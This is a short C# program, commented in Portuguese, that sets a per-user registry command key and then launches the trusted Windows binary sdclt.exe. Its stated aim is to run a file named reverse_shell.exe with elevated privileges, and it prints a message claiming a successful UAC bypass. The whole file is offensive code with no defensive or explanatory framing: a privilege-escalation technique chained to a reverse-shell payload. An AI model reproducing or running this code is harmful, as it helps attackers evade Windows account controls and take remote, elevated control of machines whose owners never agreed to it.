using System;
using Microsoft.Win32;
using System.Diagnostics;

namespace ShadowPath
{
    class Program
    {
        static void Main(string[] args)
        {
            // Caminho do executável que será executado com privilégios elevados
            string payloadPath = @"C:\Users\Public\reverse_shell.exe";

            // Cria a chave no registro que o sdclt.exe consulta
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\exefile\shell\runas\command");
            key.SetValue("", payloadPath); // Define o executável a ser iniciado
            key.Close();

            // Executa o binário confiável do Windows que triga a execução com privilégios
            Process.Start("sdclt.exe");

            Console.WriteLine("[+] Payload executado com privilégios elevados (UAC bypass via sdclt.exe).");
        }
    }
}
